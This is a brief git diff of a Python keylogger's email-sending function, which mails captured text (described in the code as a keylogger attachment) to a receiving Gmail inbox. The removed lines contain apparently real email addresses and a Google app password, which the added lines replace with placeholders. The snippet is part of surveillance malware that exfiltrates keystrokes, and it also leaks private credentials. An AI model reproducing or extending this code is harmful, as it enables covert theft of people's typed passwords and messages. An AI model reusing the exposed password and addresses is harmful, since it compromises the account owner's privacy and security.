@@ -8,9 +8,9 @@ import csv
 def sendEmail(tetxt):
     subject = tetxt
     body = "This is an email with keylogger attachment sent from Python"
-    sender_email = "100motivationmindset100@gmail.com"
-    receiver_email = "223souvikchakraborty@gmail.com"   
-    password = "dbakeaaaqpuehdmt"  #Google App password and 2-step verification must be on 
+    sender_email = "Sender Mail"
+    receiver_email = "receiver mail"   
+    password = "Password"  #Google App password and 2-step verification must be on 
 
     # Create a multipart message and set headers
     message = MIMEMultipart()
